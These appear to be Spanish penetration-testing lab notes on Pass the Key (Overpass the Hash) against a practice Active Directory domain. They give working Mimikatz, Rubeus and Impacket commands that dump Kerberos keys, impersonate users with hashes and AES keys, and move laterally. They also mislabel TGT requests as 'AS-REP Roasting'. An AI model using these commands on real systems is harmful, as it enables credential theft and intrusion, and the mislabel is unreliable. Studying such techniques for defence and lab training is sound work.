# Pass the Key (Overpass the Hash)

Técnica que consiste en utilizar un hash de contraseña NTLM o claves Kerberos para convertirlos en un ticket válido de Kerberos (TGT). Lo primero que necesitamos es obtener las claves de cifrado de Kerberos.

## Desde windows (victima)
##### obtener claves de cifrado kerberos con mimikatz
```powershell
# Obtener claves `AES256_HMAC` y `RC4_HMAC`
privilege::debug
sekurlsa::ekeys

# OUTPUT
y List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

##### Acontecer Pass the Key con Mimikatz
Con esta key rc4 podemos hacer el pass the key:
```powershell

privilege::debug

	sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Esto creará una nueva ventana de `cmd.exe` que podemos usar para solicitar acceso a cualquier servicio que queramos en el contexto del usuario objetivo.

Ejemplos de uso una vez tenemos ya el ticket y estamos en la nueva ventana de CMD como el usuario suplantado:
```cmd
dir \\DC01\C$

# Para control remoto de otro equipo de la red si tenemos permisos
Enter-PSSession -ComputerName WKSTN02
```

##### Acontecer Pass the Key con Rubeus
> Lo bueno es que para esto con Rubeus no necesitamos permisos de administrador

```
# Como puedes ver aqui estamos utilizando la aes256
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

>NOTA PASS THE KEY: En entornos modernos, utilizar rc4 se interpreta como downgrade de cifrado, entonces lo que se utiliza es el AES256 o AES128

----

## Desde Linux

Habiendo obtenido un Keytab y reaizado la extraccion del hash, por ejemplo con  https://github.com/sosdave/KeyTabExtract (se explica en la nota de pass the ticket - como abusar de un keytab). 

#### Pass the key con AES256
Se puede hacer un pass the key con la cadena obtenida (En este caso con AES256)
```bash
impacket-wmiexec INLANEFREIGHT.HTB/carlos@10.129.x.x -aesKey 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f -no-pass
```

### Pasar de key a pass the ticket
Otra opcion es obtener el `.ccache` gracias al AES256 obtenido. Seria solicitar un TGT. Esta tecnica se llama "AS-REP Roasting" con clave.

Este comando se comunicará con el Domain Controller, usará la clave AES para demostrar que "eres" `svc_workstations` y, si tiene éxito, guardará un ticket de Kerberos en un archivo llamado `svc_workstations.ccache`.
```bash

impacket-getTGT.py INLANEFREIGHT.HTB/svc_workstations -aesKey 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
```

Con este fichero podemos hacer un pass the ticket realizando el:
```bash
# Apuntar la variable de entorno al ticket que acabas de crear
export KRB5CCNAME=svc_workstations.ccache

# Verificar que el ticket está cargado
klist
```

Con el ticket cargado en tu sesión (podemos importarlo en Parrot directamente), puedes usar cualquier herramienta compatible con Kerberos (como `impacket-smbclient`, `impacket-psexec`, `evil-winrm`, etc.) con el flag `-k` para autenticarte.


